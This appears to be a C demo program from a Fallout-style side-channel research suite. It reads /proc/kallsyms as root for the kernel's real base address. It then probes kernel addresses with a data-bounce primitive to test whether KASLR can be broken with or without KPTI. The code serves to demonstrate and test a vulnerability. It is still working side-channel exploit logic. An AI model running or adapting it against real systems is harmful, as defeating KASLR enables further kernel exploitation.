#include "../primitives/basic_primitives.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <linux/version.h>


#define KASLR_ALIGNMENT 0x100000ll

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 0, 0) // TODO: Find the exact version which introduced this change
#define KPTI_MAPPED_PAGE_OFFSET 0x800000ll
#else
#define KPTI_MAPPED_PAGE_OFFSET 0xa00000ll
#endif

#define ADDRESS_RANGE_START (void*) 0xffffffff81000000ull
#define KALLSYMS "/proc/kallsyms"
#define REPS 500

uint64_t get_kallsym(char *symbol) {
    ssize_t len = 1024;
    FILE *kallsysms_fd = fopen(KALLSYMS, "r");
    char *read_buffer = NULL, *sym = malloc(len);
    uint64_t address = 0;
    char t = 0;
    while (getline(&read_buffer, &len, kallsysms_fd)) {
        memset(sym, 0, 1024);
        sscanf(read_buffer, "%lx %c %s", &address, &t, sym);
        if (strcmp(sym, symbol) == 0) break;
        address = 0;
    }
    if (read_buffer) free(read_buffer);
    free(sym);
    fclose(kallsysms_fd);
    return address;
}

int main() {
    void *base_addr = (void *) get_kallsym("_text"), *addr = ADDRESS_RANGE_START - KPTI_MAPPED_PAGE_OFFSET;
    if (!base_addr) {
        printf("Could not open /proc/kallsyms! Make sure that you run this demo as root!\n");
        return 1;
    }
    int
            page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size, page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    fallout_init();
    printf("Demo 4: Breaking KASLR\n");
    printf("From reading /proc/kallsyms, we determined that the base address of your kernel's .text section is %p.\nIf we can find this address using data bounce, your system is vulnerable.\n",
           base_addr);
    uint64_t delta = 0, kpti_offset = KPTI_MAPPED_PAGE_OFFSET;
    char *loading = "-\\|/";
    while (1) {
        printf("[%p... %c]                     \r", addr + delta + kpti_offset, loading[(delta / KASLR_ALIGNMENT) % 4]);
        fflush(stdout);
        if (data_bounce(mem, addr + delta + kpti_offset, REPS)) {
            if (addr + delta + kpti_offset == base_addr) {
                printf("An unusual amount of hits was detected at %p. This means that KASLR was successfully broken, and KPTI is likely disabled on your system. \n",
                       addr + delta + kpti_offset);
                break;
            } else if (addr + delta == base_addr) {
                printf("An unusual amount of hits was detected at %p. This means that KPTI is likely enabled on your system, so we can infer that the real base address is %p. KASLR was successfully broken. \n",
                       addr + delta + kpti_offset, addr + delta);
                break;
            } else {
                printf("A false positive was encountered at %p!\n",
                       addr + delta + kpti_offset);
            }

        }
        delta += KASLR_ALIGNMENT;
        if ((uint64_t) addr + delta > (uint64_t) base_addr + KASLR_ALIGNMENT + KPTI_MAPPED_PAGE_OFFSET) {
            printf("There was no significant increase in data bounce hits near the correct base address, so KASLR was not broken.\n");
            printf("Note that this method can be unreliable at times, so restarting the demo might yield different results.\n");
            break;
        }
    }
    free(mem);
    fallout_cleanup();
    return 0;
}
